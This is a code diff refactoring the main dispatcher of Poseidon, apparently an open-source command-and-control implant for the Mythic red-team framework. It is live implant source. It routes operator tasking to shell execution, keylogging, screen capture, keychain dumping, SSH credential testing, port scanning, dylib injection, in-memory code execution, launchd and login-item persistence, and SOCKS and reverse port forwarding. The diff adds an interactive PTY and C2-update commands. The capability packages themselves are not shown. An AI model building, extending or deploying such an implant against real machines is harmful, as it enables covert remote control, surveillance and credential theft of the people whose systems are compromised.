@@ -2,13 +2,19 @@ package main
 
 import (
 	"C"
-
+	"encoding/base64"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/enums/InteractiveTask"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/files"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/p2p"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/print_c2"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/print_p2p"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pty"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/rpfwd"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/update_c2"
 
 	// Standard
 	"encoding/json"
 	"fmt"
-	"net"
 	"sort"
 	"sync"
 
@@ -57,7 +63,6 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/xpc"
 )
 import (
-	"encoding/binary"
 	//_ "net/http/pprof"
 	"os"
 
@@ -72,16 +77,13 @@ const (
 )
 
 // list of currently running tasks
-var runningTasks = make(map[string](structs.Task))
-var mu sync.Mutex
+
+var runningTasks = make(map[string]structs.Task)
+var runningTaskMutex sync.RWMutex
+var removeRunningTasksChannel = make(chan string, 10)
 
 // channel processes new tasking for this agent
 var newTaskChannel = make(chan structs.Task, 10)
-
-// channel processes responses that should go out and directs them towards the egress direction
-var newResponseChannel = make(chan structs.Response, 10)
-var newDelegatesToMythicChannel = make(chan structs.DelegateMessage, 10)
-var P2PConnectionMessageChannel = make(chan structs.P2PConnectionMessage, 10)
 
 // Mapping of command names to integers
 var tasktypes = map[string]int{
@@ -133,95 +135,42 @@ var tasktypes = map[string]int{
 	"clipboard_monitor": 48,
 	"execute_macho":     49,
 	"rpfwd":             50,
+	"print_p2p":         51,
+	"print_c2":          52,
+	"update_c2":         53,
+	"pty":               54,
 	"none":              NONE_CODE,
 }
-
-// define a new instance of an egress profile and P2P profile
-var profile = profiles.New()
-
-// Map used to handle go routines that are waiting for a response from apfell to continue
-var storedFiles = make(map[string]([]byte))
-
-var sendFilesToMythicChannel = make(chan structs.SendFileToMythicStruct, 10)
-var getFilesFromMythicChannel = make(chan structs.GetFileFromMythicStruct, 10)
 
 //export RunMain
 func RunMain() {
 	main()
 }
 
-// go routine that listens for messages that should go to Mythic for sending files to Mythic
-// get things ready to transfer a file from Poseidon -> Mythic
-func sendFileToMythic() {
-	for {
-		select {
-		case fileToMythic := <-sendFilesToMythicChannel:
-			fileToMythic.TrackingUUID = profiles.GenerateSessionID()
-			fileToMythic.FileTransferResponse = make(chan json.RawMessage)
-			fileToMythic.Task.Job.FileTransfers[fileToMythic.TrackingUUID] = fileToMythic.FileTransferResponse
-			go profiles.SendFile(fileToMythic)
-		}
-	}
-}
-
 // go routine that listens for messages that should go to Mythic for getting files from Mythic
 // get things ready to transfer a file from Mythic -> Poseidon
-func getFileFromMythic() {
-	for {
-		select {
-		case getFile := <-getFilesFromMythicChannel:
-			getFile.TrackingUUID = profiles.GenerateSessionID()
-			getFile.FileTransferResponse = make(chan json.RawMessage)
-			getFile.Task.Job.FileTransfers[getFile.TrackingUUID] = getFile.FileTransferResponse
-			go profiles.GetFile(getFile)
-		}
-	}
-}
 
-// save a file to memory for easy access later
-func saveFile(fileUUID string, data []byte) {
-	storedFiles[fileUUID] = data
-}
-
-// remove saved file from memory
-func removeSavedFile(fileUUID string) {
-	delete(storedFiles, fileUUID)
-}
-
-// get a saved file from memory
-func getSavedFile(fileUUID string) []byte {
-	if data, ok := storedFiles[fileUUID]; ok {
-		return data
-	} else {
-		return nil
-	}
-}
-
-func handleInboundMythicMessageFromEgressP2PChannel() {
+func listenForInboundMythicMessageFromEgressP2PChannel() {
 	for {
 		//fmt.Printf("looping to see if there's messages in the profiles.HandleInboundMythicMessageFromEgressP2PChannel\n")
-		select {
-		case message := <-profiles.HandleInboundMythicMessageFromEgressP2PChannel:
-			//fmt.Printf("Got message from HandleInboundMythicMessageFromEgressP2PChannel\n")
-			go handleMythicMessageResponse(message)
-		}
+		message := <-profiles.HandleInboundMythicMessageFromEgressP2PChannel
+		//fmt.Printf("Got message from HandleInboundMythicMessageFromEgressP2PChannel\n")
+		handleMythicMessageResponse(message)
 	}
 }
 
 // Handle responses from mythic from post_response
 func handleMythicMessageResponse(mythicMessage structs.MythicMessageResponse) {
-	// Handle the response from apfell
+	// Handle the response from mythic
 	//fmt.Printf("handleMythicMessageResponse:\n%v\n", mythicMessage)
 	// loop through each response and check to see if the file_id or task_id matches any existing background tasks
 	for i := 0; i < len(mythicMessage.Responses); i++ {
 		var r map[string]interface{}
-		err := json.Unmarshal([]byte(mythicMessage.Responses[i]), &r)
+		err := json.Unmarshal(mythicMessage.Responses[i], &r)
 		if err != nil {
 			//log.Printf("Error unmarshal response to task response: %s", err.Error())
 			break
 		}
-
-		//log.Printf("Handling response from apfell: %+v\n", r)
 		if taskid, ok := r["task_id"]; ok {
 			if task, exists := runningTasks[taskid.(string)]; exists {
 				// send data to the channel
@@ -245,13 +194,26 @@ func handleMythicMessageResponse(mythicMessage structs.MythicMessageResponse) {
 	}
 	// loop through each socks message and send it off
 	for j := 0; j < len(mythicMessage.Socks); j++ {
-		//fmt.Printf("got socks message from Mythic %v\n", mythicMessage.Socks[j].ServerId)
+		//fmt.Printf("got socks message from Mythic %v\n", mythicMessage.Socks[j])
 		profiles.FromMythicSocksChannel <- mythicMessage.Socks[j]
 		//fmt.Printf("sent socks message to profiles.FromMythicSocksChannel %v\n", mythicMessage.Socks[j].ServerId)
 	}
 	// loop through each rpwfd message and send it off
 	for j := 0; j < len(mythicMessage.Rpfwds); j++ {
 		profiles.FromMythicRpfwdChannel <- mythicMessage.Rpfwds[j]
+	}
+	// loop through interactive tasks
+	for j := 0; j < len(mythicMessage.InteractiveTasks); j++ {
+		if task, exists := runningTasks[mythicMessage.InteractiveTasks[j].TaskUUID]; exists {
+			fmt.Printf("interactive task exists, sending data along\n")
+			task.Job.InteractiveTaskInputChannel <- mythicMessage.InteractiveTasks[j]
+		} else {
+			profiles.NewInteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
+				TaskUUID:    mythicMessage.InteractiveTasks[j].TaskUUID,
+				Data:        base64.StdEncoding.EncodeToString([]byte("Task no longer running\n")),
+				MessageType: InteractiveTask.Error,
+			}
+		}
 	}
 	// sort the Tasks
 	sort.Slice(mythicMessage.Tasks, func(i, j int) bool {
@@ -260,250 +222,227 @@ func handleMythicMessageResponse(mythicMessage structs.MythicMessageResponse) {
 	// for each task, give it the appropriate Job information and send it on its way for processing
 	for j := 0; j < len(mythicMessage.Tasks); j++ {
 		job := &structs.Job{
-			Stop:                               new(int),
-			ReceiveResponses:                   make(chan json.RawMessage, 10),
-			SendResponses:                      newResponseChannel,
-			SendFileToMythic:                   sendFilesToMythicChannel,
-			FileTransfers:                      make(map[string](chan json.RawMessage)),
-			GetFileFromMythic:                  getFilesFromMythicChannel,
-			SaveFileFunc:                       saveFile,
-			RemoveSavedFile:                    removeSavedFile,
-			GetSavedFile:                       getSavedFile,
-			AddNewInternalTCPConnectionChannel: profiles.AddNewInternalTCPConnectionChannel,
-			RemoveInternalTCPConnectionChannel: profiles.RemoveInternalTCPConnectionChannel,
-			C2:                                 profile,
+			Stop:                            new(int),
+			ReceiveResponses:                make(chan json.RawMessage, 10),
+			SendResponses:                   profiles.NewResponseChannel,
+			SendFileToMythic:                files.SendToMythicChannel,
+			FileTransfers:                   make(map[string]chan json.RawMessage),
+			GetFileFromMythic:               files.GetFromMythicChannel,
+			SaveFileFunc:                    files.SaveToMemory,
+			RemoveSavedFile:                 files.RemoveFromMemory,
+			GetSavedFile:                    files.GetFromMemory,
+			AddInternalConnectionChannel:    p2p.AddInternalConnectionChannel,
+			RemoveInternalConnectionChannel: p2p.RemoveInternalConnectionChannel,
+			InteractiveTaskOutputChannel:    profiles.NewInteractiveTaskOutputChannel,
+			InteractiveTaskInputChannel:     make(chan structs.InteractiveTaskMessage, 50),
+			NewAlertChannel:                 profiles.NewAlertChannel,
 		}
 		mythicMessage.Tasks[j].Job = job
+		runningTaskMutex.Lock()
 		runningTasks[mythicMessage.Tasks[j].TaskID] = mythicMessage.Tasks[j]
+		runningTaskMutex.Unlock()
 		newTaskChannel <- mythicMessage.Tasks[j]
 	}
 	// loop through each delegate and try to forward it along
 	if len(mythicMessage.Delegates) > 0 {
-		profiles.HandleDelegateMessageForInternalTCPConnections(mythicMessage.Delegates)
+		p2p.HandleDelegateMessageForInternalP2PConnections(mythicMessage.Delegates)
 	}
 	//fmt.Printf("returning from handleMythicMessageResponse\n")
 	return
 }
 
-// gather the responses from the task go routines into a central location
-func aggregateResponses() {
-	for {
-		select {
-		case response := <-newResponseChannel:
-			marshalledResponse, err := json.Marshal(response)
-			if err != nil {
-
-			} else {
-				if response.Completed {
-					// We need to remove this job from our list of jobs
-					delete(runningTasks, response.TaskID)
-				}
-				mu.Lock()
-				profiles.TaskResponses = append(profiles.TaskResponses, marshalledResponse)
-				mu.Unlock()
-			}
-
-		}
-	}
-}
-
-// gather the delegate messages that need to go out the egress channel into a central location
-func aggregateDelegateMessagesToMythic() {
-	for {
-		select {
-		case response := <-newDelegatesToMythicChannel:
-			mu.Lock()
-			profiles.DelegateResponses = append(profiles.DelegateResponses, response)
-			mu.Unlock()
-		}
-	}
-}
-
-// gather the edge notifications that need to go out the egress channel
-func aggregateEdgeAnnouncementsToMythic() {
-	for {
-		select {
-		case response := <-P2PConnectionMessageChannel:
-			mu.Lock()
-			profiles.P2PConnectionMessages = append(profiles.P2PConnectionMessages, response)
-			mu.Unlock()
-		}
-	}
-}
-
 // process new tasking and call their go routines
-func handleNewTask() {
+func listenForNewTask() {
+	for {
+		task := <-newTaskChannel
+		switch tasktypes[task.Command] {
+		case EXIT_CODE:
+			os.Exit(0)
+			break
+		case 1:
+			go shell.Run(task)
+			break
+		case 2:
+			go screencapture.Run(task)
+			break
+		case 3:
+			go keylog.Run(task)
+			break
+		case 4:
+			go download.Run(task)
+			break
+		case 5:
+			go upload.Run(task)
+			break
+		case 6:
+			go libinject.Run(task)
+			break
+		case 8:
+			go ps.Run(task)
+			break
+		case 9:
+			// Sleep
+			go sleep.Run(task)
+			break
+		case 10:
+			//Cat a file
+			go cat.Run(task)
+			break
+		case 11:
+			//Change cwd
+			go cd.Run(task)
+			break
+		case 12:
+			//List directory contents
+			go ls.Run(task)
+			break
+		case 14:
+			//Execute jxa code in memory
+			go jxa.Run(task)
+			break
+		case 15:
+			// Enumerate keyring data for linux or the keychain for macos
+			go keys.Run(task)
+			break
+		case 16:
+			// Triage a directory and organize files by type
+			go triagedirectory.Run(task)
+			break
+		case 17:
+			// Test credentials against remote hosts
+			go sshauth.Run(task)
+			break
+		case 18:
+			// Scan ports on remote hosts.
+			go portscan.Run(task)
+			break
+		case 21:
+			// Return the list of jobs.
+			go getJobListing(task)
+			break
+		case 22:
+			// Kill the job
+			go killJob(task)
+			break
+		case 23:
+			go cp.Run(task)
+			break
+		case 24:
+			// List drives on a machine
+			go drives.Run(task)
+			break
+		case 25:
+			// Retrieve information about the current user.
+			go getuser.Run(task)
+			break
+		case 26:
+			// Make a directory
+			go mkdir.Run(task)
+			break
+		case 27:
+			// Move files
+			go mv.Run(task)
+			break
+		case 28:
+			// Print working directory
+			go pwd.Run(task)
+			break
+		case 29:
+			go rm.Run(task)
+			break
+		case 30:
+			go getenv.Run(task)
+			break
+		case 31:
+			go setenv.Run(task)
+			break
+		case 32:
+			go unsetenv.Run(task)
+			break
+		case 33:
+			go kill.Run(task)
+			break
+		case 34:
+			go curl.Run(task)
+			break
+		case 35:
+			go xpc.Run(task)
+			break
+		case 36:
+			go socks.Run(task)
+			break
+		case 37:
+			go listtasks.Run(task)
+			break
+		case 38:
+			go list_entitlements.Run(task)
+			break
+		case 39:
+			go execute_memory.Run(task)
+			break
+		case 40:
+			go jsimport.Run(task)
+			break
+		case 41:
+			//Execute jxa code in memory from the script imported by jsimport
+			go jsimport_call.Run(task)
+			break
+		case 42:
+			//Execute persist_launch command to install launchd persistence
+			go persist_launchd.Run(task)
+			break
+		case 43:
+			// Execute persist_loginitem command to install login item persistence
+			go persist_loginitem.Run(task)
+			break
+		case 44:
+			// Execute spawn_libinject command to spawn a target application/binary with the DYLD_INSERT_LIBRARIES variable set to an arbitrary dylib
+			go dyldinject.Run(task)
+			break
+		case 45:
+			go link_tcp.Run(task)
+			break
+		case 46:
+			go unlink_tcp.Run(task)
+			break
+		case 47:
+			go run.Run(task)
+			break
+		case 48:
+			go clipboard_monitor.Run(task)
+			break
+		case 49:
+			go execute_macho.Run(task)
+			break
+		case 50:
+			go rpfwd.Run(task)
+			break
+		case 51:
+			go print_p2p.Run(task)
+			break
+		case 52:
+			go print_c2.Run(task)
+			break
+		case 53:
+			go update_c2.Run(task)
+			break
+		case 54:
+			go pty.Run(task)
+			break
+		case NONE_CODE:
+			// No tasks, do nothing
+			break
+		}
+	}
+}
+
+func listenForRemoveRunningTask() {
 	for {
 		select {
-		case task := <-newTaskChannel:
-			//fmt.Printf("Handling new task: %v\n", task)
-			switch tasktypes[task.Command] {
-			case EXIT_CODE:
-				os.Exit(0)
-				break
-			case 1:
-				go shell.Run(task)
-				break
-			case 2:
-				go screencapture.Run(task)
-				break
-			case 3:
-				go keylog.Run(task)
-				break
-			case 4:
-				go download.Run(task)
-				break
-			case 5:
-				go upload.Run(task)
-				break
-			case 6:
-				go libinject.Run(task)
-				break
-			case 8:
-				go ps.Run(task)
-				break
-			case 9:
-				// Sleep
-				go sleep.Run(task)
-				break
-			case 10:
-				//Cat a file
-				go cat.Run(task)
-				break
-			case 11:
-				//Change cwd
-				go cd.Run(task)
-				break
-			case 12:
-				//List directory contents
-				go ls.Run(task)
-				break
-			case 14:
-				//Execute jxa code in memory
-				go jxa.Run(task)
-				break
-			case 15:
-				// Enumerate keyring data for linux or the keychain for macos
-				go keys.Run(task)
-				break
-			case 16:
-				// Triage a directory and organize files by type
-				go triagedirectory.Run(task)
-				break
-			case 17:
-				// Test credentials against remote hosts
-				go sshauth.Run(task)
-				break
-			case 18:
-				// Scan ports on remote hosts.
-				go portscan.Run(task)
-				break
-			case 21:
-				// Return the list of jobs.
-				go getJobListing(task)
-				break
-			case 22:
-				// Kill the job
-				go killJob(task)
-				break
-			case 23:
-				go cp.Run(task)
-				break
-			case 24:
-				// List drives on a machine
-				go drives.Run(task)
-				break
-			case 25:
-				// Retrieve information about the current user.
-				go getuser.Run(task)
-				break
-			case 26:
-				// Make a directory
-				go mkdir.Run(task)
-				break
-			case 27:
-				// Move files
-				go mv.Run(task)
-				break
-			case 28:
-				// Print working directory
-				go pwd.Run(task)
-				break
-			case 29:
-				go rm.Run(task)
-				break
-			case 30:
-				go getenv.Run(task)
-				break
-			case 31:
-				go setenv.Run(task)
-				break
-			case 32:
-				go unsetenv.Run(task)
-				break
-			case 33:
-				go kill.Run(task)
-				break
-			case 34:
-				go curl.Run(task)
-				break
-			case 35:
-				go xpc.Run(task)
-				break
-			case 36:
-				go socks.Run(task)
-				break
-			case 37:
-				go listtasks.Run(task)
-				break
-			case 38:
-				go list_entitlements.Run(task)
-				break
-			case 39:
-				go execute_memory.Run(task)
-				break
-			case 40:
-				go jsimport.Run(task)
-				break
-			case 41:
-				//Execute jxa code in memory from the script imported by jsimport
-				go jsimport_call.Run(task)
-				break
-			case 42:
-				//Execute persist_launch command to install launchd persistence
-				go persist_launchd.Run(task)
-				break
-			case 43:
-				// Execute persist_loginitem command to install login item persistence
-				go persist_loginitem.Run(task)
-				break
-			case 44:
-				// Execute spawn_libinject command to spawn a target application/binary with the DYLD_INSERT_LIBRARIES variable set to an arbitrary dylib
-				go dyldinject.Run(task)
-				break
-			case 45:
-				go link_tcp.Run(task)
-				break
-			case 46:
-				go unlink_tcp.Run(task)
-				break
-			case 47:
-				go run.Run(task)
-				break
-			case 48:
-				go clipboard_monitor.Run(task)
-				break
-			case 49:
-				go execute_macho.Run(task)
-				break
-			case 50:
-				go rpfwd.Run(task)
-				break
-			case NONE_CODE:
-				// No tasks, do nothing
-				break
-			}
-			break
+		case task := <-removeRunningTasksChannel:
+			runningTaskMutex.Lock()
+			delete(runningTasks, task)
+			runningTaskMutex.Unlock()
 		}
 	}
 }
@@ -556,98 +495,18 @@ func killJob(task structs.Task) {
 	task.Job.SendResponses <- msg
 }
 
-// Tasks send a new net.Conn object to the task.Job.AddNewInternalConnectionChannel for poseidon to track
-func handleAddNewInternalTCPConnections() {
-	for {
-		select {
-		case newConnection := <-profiles.AddNewInternalTCPConnectionChannel:
-			//fmt.Printf("handleNewInternalTCPConnections message from channel for %v\n", newConnection)
-			newUUID := profiles.AddNewInternalTCPConnection(newConnection)
-			go readFromInternalTCPConnections(newConnection, newUUID)
-		}
-	}
-}
-
-func readFromInternalTCPConnections(newConnection net.Conn, tempConnectionUUID string) {
-	// read from the internal connections to pass back out to Mythic
-	//fmt.Printf("readFromInternalTCPConnection started for %v\n", newConnection)
-	var sizeBuffer uint32
-	for {
-		err := binary.Read(newConnection, binary.BigEndian, &sizeBuffer)
-		if err != nil {
-			fmt.Println("Failed to read size from tcp connection:", err)
-			profiles.RemoveInternalTCPConnectionChannel <- tempConnectionUUID
-			return
-		}
-		if sizeBuffer > 0 {
-			readBuffer := make([]byte, sizeBuffer)
-
-			readSoFar, err := newConnection.Read(readBuffer)
-			if err != nil {
-				fmt.Println("Failed to read bytes from tcp connection:", err)
-				profiles.RemoveInternalTCPConnectionChannel <- tempConnectionUUID
-				return
-			}
-			totalRead := uint32(readSoFar)
-			for totalRead < sizeBuffer {
-				// we didn't read the full size of the message yet, read more
-				nextBuffer := make([]byte, sizeBuffer-totalRead)
-				readSoFar, err = newConnection.Read(nextBuffer)
-				if err != nil {
-					fmt.Println("Failed to read bytes from tcp connection:", err)
-					profiles.RemoveInternalTCPConnectionChannel <- tempConnectionUUID
-					return
-				}
-				copy(readBuffer[totalRead:], nextBuffer)
-				totalRead = totalRead + uint32(readSoFar)
-			}
-			//fmt.Printf("Read %d bytes from connection\n", totalRead)
-			newDelegateMessage := structs.DelegateMessage{}
-			newDelegateMessage.Message = string(readBuffer)
-			newDelegateMessage.UUID = profiles.GetInternalConnectionUUID(tempConnectionUUID)
-			newDelegateMessage.C2ProfileName = "poseidon_tcp"
-			//fmt.Printf("Adding delegate message to channel: %v\n", newDelegateMessage)
-			newDelegatesToMythicChannel <- newDelegateMessage
-		} else {
-			//fmt.Print("Read 0 bytes from internal TCP connection\n")
-			profiles.RemoveInternalTCPConnectionChannel <- tempConnectionUUID
-		}
-
-	}
-
-}
-
-func handleRemoveInternalTCPConnections() {
-	for {
-		select {
-		case removeConnection := <-profiles.RemoveInternalTCPConnectionChannel:
-			//fmt.Printf("handleRemoveInternalTCPConnections message from channel for %v\n", removeConnection)
-			successfullyRemovedConnection := false
-			removalMessage := structs.P2PConnectionMessage{Action: "remove", C2ProfileName: "poseidon_tcp", Destination: removeConnection, Source: profiles.GetMythicID()}
-			successfullyRemovedConnection = profiles.RemoveInternalTCPConnection(removeConnection)
-			if successfullyRemovedConnection {
-				P2PConnectionMessageChannel <- removalMessage
-			}
-		}
-	}
-}
-
 func main() {
-	// Initialize the  agent and check in
-	go aggregateResponses()
-	go aggregateDelegateMessagesToMythic()
-	go aggregateEdgeAnnouncementsToMythic()
-	go handleNewTask()
-	go sendFileToMythic()
-	go getFileFromMythic()
-	go handleAddNewInternalTCPConnections()
-	go handleRemoveInternalTCPConnections()
-	go handleInboundMythicMessageFromEgressP2PChannel()
+	files.Initialize()
+	p2p.Initialize()
+	profiles.Initialize(removeRunningTasksChannel)
+	go listenForRemoveRunningTask()
+	go listenForNewTask()
+	go listenForInboundMythicMessageFromEgressP2PChannel()
 	/*
 		go func() {
 			log.Println(http.ListenAndServe("192.168.0.127:8080", nil))
 		}()
 	*/
-	profile.Start()
+	profiles.Start()
 
 }
